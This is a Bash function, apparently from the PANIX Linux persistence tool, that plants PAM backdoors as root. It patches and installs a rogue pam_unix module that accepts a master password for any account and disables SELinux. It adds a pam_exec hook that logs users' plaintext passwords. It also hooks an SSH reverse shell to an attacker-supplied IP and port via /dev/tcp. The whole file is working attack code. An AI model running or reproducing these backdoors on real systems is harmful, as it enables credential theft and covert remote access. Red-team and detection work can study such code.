setup_pam_persistence() {
	local pam_version=""
	local password=""
	local mechanism=""
	local log=""
	local backdoor=""
	local ip=""
	local port=""

	if [[ $EUID -ne 0 ]]; then
		echo "[-] This function can only be run as root."
		exit 1
	fi

	usage_pam_persistence() {
		echo "Usage: ./panix.sh --pam [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--module                     Inject rogue PAM module"
		echo "  --password <password>        Specify the backdoor password"
		echo "--pam-exec                   Inject via PAM_EXEC"
		echo "  --log                        Log user passwords"
		echo "  --backdoor                   Inject reverse shell backdoor"
		echo "    --ip <ip>                    Specify IP address"
		echo "    --port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--password )
				shift
				password="$1"
				;;
			--module | --pam-exec )
				mechanism="$1"
				;;
			--log )
				log=1
				;;
			--backdoor )
				backdoor=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --pam --module --password <password>"
				echo "sudo ./panix.sh --pam --pam-exec --log"
				echo "sudo ./panix.sh --pam --pam-exec --backdoor --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_pam_persistence
				exit 0
				;;
			* )
				echo "[-] Invalid option: $1"
				echo "Try './panix.sh --pam --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $mechanism ]]; then
		echo "[-] Missing required option: --module or --pam-exec."
		echo "Try './panix.sh --pam --help' for more information."
		exit 1
	fi

	if [[ "$mechanism" == "--module" && -z $password ]]; then
		echo "[-] --module requires --password."
		echo "Try './panix.sh --pam --help' for more information."
		exit 1
	fi

	if [[ "$mechanism" == "--pam-exec" ]]; then
		if [[ -z $log && -z $backdoor ]]; then
			echo "[-] --pam-exec requires either --log or --backdoor."
			echo "Try './panix.sh --pam --help' for more information."
			exit 1
		fi
		if [[ $backdoor -eq 1 && ( -z $ip || -z $port ) ]]; then
			echo "[-] --backdoor requires --ip and --port."
			echo "Try './panix.sh --pam --help' for more information."
			exit 1
		fi
	fi

	case $mechanism in
		# Inspired by: https://github.com/zephrax/linux-pam-backdoor
		--module )
			echo "[+] Determining PAM version..."
			if [ -f /etc/os-release ]; then
				. /etc/os-release
				linux_distro=${ID_LIKE:-$ID}
			else
				linux_distro=$(uname -s | tr '[:upper:]' '[:lower:]')
			fi

			case "$linux_distro" in
				*ubuntu*|*debian*|*mint*|*kali*)
					pam_version=$(dpkg -s libpam-modules 2>/dev/null | grep -i '^Version:' | awk '{ print $2 }')
					if [ -n "$pam_version" ]; then
						pam_version="${pam_version%%-*}"
					else
						echo "[-] PAM version not found on this system."
						exit 1
					fi
					;;
				*rhel*|*centos*|*fedora*)
					if command -v rpm &>/dev/null; then
						pam_version=$(rpm -q pam --queryformat '%{VERSION}-%{RELEASE}\n' 2>/dev/null)
						if [ -n "$pam_version" ]; then
							pam_version="${pam_version%%-*}"
						else
							echo "[-] PAM package not found."
							exit 1
						fi
					else
						echo "[-] RPM package manager not found."
						exit 1
					fi
					;;
				*)
					echo "[-] Unsupported distribution: $linux_distro"
					exit 1
					;;
			esac

			echo "[+] Detected PAM Version: '${pam_version}'"

			local dl_url="https://github.com/linux-pam/linux-pam/releases/download/v${pam_version}/Linux-PAM-${pam_version}.tar.xz"
			local src_dir="/tmp/Linux-PAM-${pam_version}"
			local tar_file="/tmp/linux_pam.tar"

			echo "[+] Downloading PAM source..."
			if command -v curl &>/dev/null; then
				curl -fsSL -o "$tar_file" "$dl_url"
			elif command -v wget &>/dev/null; then
				wget -q -O "$tar_file" "$dl_url"
			else
				echo "[-] Neither curl nor wget is available. Please install one of them and try again."
				exit 1
			fi

			if [ -f "$tar_file" ]; then
				echo "[+] Download completed. Extracting..."
				if tar -xvf "$tar_file" -C /tmp/ > /dev/null 2>&1; then
					rm -f "$tar_file"
					if [ -d "$src_dir" ]; then
						echo "[+] Extraction completed."
					else
						echo "[-] Extraction failed: Source directory not found."
						exit 1
					fi
				else
					echo "[-] Extraction failed."
					exit 1
				fi
			else
				echo "[-] Download failed: TAR file not found."
				exit 1
			fi

			echo "[+] Modifying PAM source..."
			local target_file="$src_dir/modules/pam_unix/pam_unix_auth.c"
			if grep -q "retval = _unix_verify_password(pamh, name, p, ctrl);" "$target_file"; then
				sed -i '/retval = _unix_verify_password(pamh, name, p, ctrl);/a\
				if (p != NULL && strcmp(p, "'$password'") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }' "$target_file"
				echo "[+] Source modified successfully."
			else
				echo "[-] Target string not found in $target_file. Modification failed."
				exit 1
			fi

			echo "[+] Compiling PAM source..."
			cd "$src_dir" || exit
			if [ ! -f "./configure" ]; then
				./autogen.sh
			fi
			./configure > /dev/null 2>&1
			make -j"$(nproc)" > /dev/null 2>&1

			if [ ! -f "modules/pam_unix/.libs/pam_unix.so" ]; then
				echo "[-] Compilation failed: PAM library not created."
				exit 1
			fi

			echo "[+] PAM compiled successfully."

			echo "[+] Detecting PAM library directory..."
			local dest_dir=""
			local possible_dirs=(
				"/lib/security"
				"/usr/lib64/security"
				"/lib/x86_64-linux-gnu/security"
				"/lib64/security"
			)

			for dir in "${possible_dirs[@]}"; do
				if [ -d "$dir" ] && [ -f "$dir/pam_unix.so" ]; then
					dest_dir="$dir"
					break
				fi
			done

			if [ -z "$dest_dir" ]; then
				echo "[-] Could not detect a valid PAM library directory."
				exit 1
			fi

			echo "[+] Copying PAM library to $dest_dir..."
			mv -f modules/pam_unix/.libs/pam_unix.so "$dest_dir"

			echo "[+] Checking SELinux status..."
			if command -v sestatus &>/dev/null && sestatus | grep -q "enabled"; then
				echo "[!] SELinux is enabled. Disabling SELinux..."
				setenforce 0
				echo "[!] SELinux disabled. Re-enable it after testing if necessary."
			fi

			echo "[+] Rogue PAM injected!"
			echo ""
			echo "You can now login to any user (including root) with a login shell using your specified password."
			echo "Example: su - user"
			echo "Example: ssh user@ip"
			;;

		--pam-exec )

			# Technique used from: https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
			if [[ $log -eq 1 ]]; then

				# Step 1: Create the script /var/log/spy.sh
				echo "[+] Creating /var/log/spy.sh..."

				echo -e "#!/bin/sh\necho \"    \$(date) \$PAM_USER, \$(cat -), From: \$PAM_RHOST\" >> /var/log/panix.log" > /var/log/spy.sh

				if [[ $? -eq 0 ]]; then
					chmod 700 /var/log/spy.sh
					if [[ $? -eq 0 ]]; then
						echo "[+] /var/log/spy.sh created and permissions set to 700."
					else
						echo "[-] Failed to set permissions on /var/log/spy.sh."
						exit 1
					fi
				else
					echo "[-] Failed to create /var/log/spy.sh."
					exit 1
				fi

				# Step 2: Create /var/log/panix.log
				echo "[+] Creating /var/log/panix.log..."

				touch /var/log/panix.log

				if [[ $? -eq 0 ]]; then
					chmod 770 /var/log/panix.log
					if [[ $? -eq 0 ]]; then
						echo "[+] /var/log/panix.log created and permissions set to 770."
					else
						echo "[-] Failed to set permissions on /var/log/panix.log."
						exit 1
					fi
				else
					echo "[-] Failed to create /var/log/panix.log."
					exit 1
				fi

				# Step 3: Append line to /etc/pam.d/common-auth
				echo "[+] Modifying /etc/pam.d/common-auth..."

				pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'

				if grep -Fxq "$pam_line" /etc/pam.d/common-auth; then
					echo "[+] The line is already present in /etc/pam.d/common-auth."
				else
					echo "$pam_line" >> /etc/pam.d/common-auth
					if [[ $? -eq 0 ]]; then
						echo "[+] Line added to /etc/pam.d/common-auth."
					else
						echo "[-] Failed to modify /etc/pam.d/common-auth."
						exit 1
					fi
				fi

				echo "[+] PAM_EXEC logging backdoor planted!"
				echo "Watch /var/log/panix.log for user passwords."

			# Inspired by: https://www.group-ib.com/blog/pluggable-authentication-module/
			elif [[ $backdoor -eq 1 ]]; then

				# Step 1: Create the reverse shell script /bin/pam_exec_backdoor.sh
				echo "[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh..."
				echo -e "#!/bin/bash\nnohup setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1' &" > /bin/pam_exec_backdoor.sh

				if [[ $? -eq 0 ]]; then
					chmod 700 /bin/pam_exec_backdoor.sh
					if [[ $? -eq 0 ]]; then
						echo "[+] /bin/pam_exec_backdoor.sh created and permissions set to 700."
					else
						echo "[-] Failed to set permissions on /bin/pam_exec_backdoor.sh."
						exit 1
					fi
				else
					echo "[-] Failed to create /bin/pam_exec_backdoor.sh."
					exit 1
				fi

				# Step 2: Modify SSH PAM configuration
				pam_sshd_file="/etc/pam.d/sshd"
				pam_line="session    optional     pam_exec.so seteuid /bin/pam_exec_backdoor.sh"

				echo "[+] Modifying $pam_sshd_file to include the PAM_EXEC rule..."

				if grep -Fxq "$pam_line" "$pam_sshd_file"; then
					echo "[+] The PAM_EXEC rule is already present in $pam_sshd_file."
				else
					sed -i "1a ${pam_line}" "${pam_sshd_file}"
					if [[ $? -eq 0 ]]; then
						echo "[+] PAM_EXEC rule added to $pam_sshd_file."
					else
						echo "[-] Failed to modify $pam_sshd_file."
						exit 1
					fi
				fi

				# Step 3: Restart SSH service to apply changes
				echo "[+] Restarting SSH service to apply changes..."

				if systemctl restart sshd; then
					echo "[+] SSH service restarted successfully."
				else
					echo "[-] Failed to restart SSH service."
					exit 1
				fi

				echo "[+] PAM_EXEC reverse shell backdoor planted!"
				echo "Authenticate to trigger the reverse shell."
			fi
			;;
	esac

	echo "[+] PAM persistence established!"
}
